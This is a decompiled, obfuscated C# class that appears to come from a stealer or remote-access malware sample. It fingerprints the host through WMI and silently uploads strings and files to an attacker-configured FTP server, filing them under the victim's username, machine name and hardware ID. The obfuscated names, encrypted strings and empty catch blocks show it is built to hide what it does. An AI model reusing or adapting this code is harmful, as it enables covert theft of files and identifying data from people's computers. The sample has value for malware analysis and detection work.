using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

internal sealed class ySVDzMAbizHUS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string yinVnqLUaFwpJQJ()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107411862));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107411841)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107411792);
			ManagementObject val3 = new ManagementObject(getString_0(107411787) + text2 + getString_0(107411778));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107411773)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389126) : text;
		}
	}

	public static void XXsyNoNQwAhAIs(string BNDLelCXmGCD = "URL", string AZNqmSCwTFjpG = "USERNAME", string vuhyaAozFPqImGjr = "ACCESO", string nIEjoAVMBI = "")
	{
		try
		{
			string text = yinVnqLUaFwpJQJ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(BNDLelCXmGCD + getString_0(107413346) + Environment.UserName + getString_0(107413333) + Environment.MachineName + getString_0(107413312) + text + getString_0(107413307));
			ftpWebRequest.Method = getString_0(107411716);
			ftpWebRequest.Credentials = new NetworkCredential(AZNqmSCwTFjpG, vuhyaAozFPqImGjr);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(nIEjoAVMBI);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void FvMtDCdFtDGVbzA(string vdXEykzUXasSXm = "URL", string BGoZNWOivoZEm = "USERNAME", string IJSyCehOlkfzp = "ACCESO", string RFZBYSkmZlrE = "")
	{
		try
		{
			string text = yinVnqLUaFwpJQJ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(vdXEykzUXasSXm + getString_0(107413346) + Environment.UserName + getString_0(107413333) + Environment.MachineName + getString_0(107413312) + text + getString_0(107413312) + Path.GetFileName(RFZBYSkmZlrE));
			ftpWebRequest.Method = getString_0(107411716);
			ftpWebRequest.Credentials = new NetworkCredential(BGoZNWOivoZEm, IJSyCehOlkfzp);
			byte[] array = File.ReadAllBytes(RFZBYSkmZlrE);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static ySVDzMAbizHUS()
	{
		Strings.CreateGetStringDelegate(typeof(ySVDzMAbizHUS));
	}
}
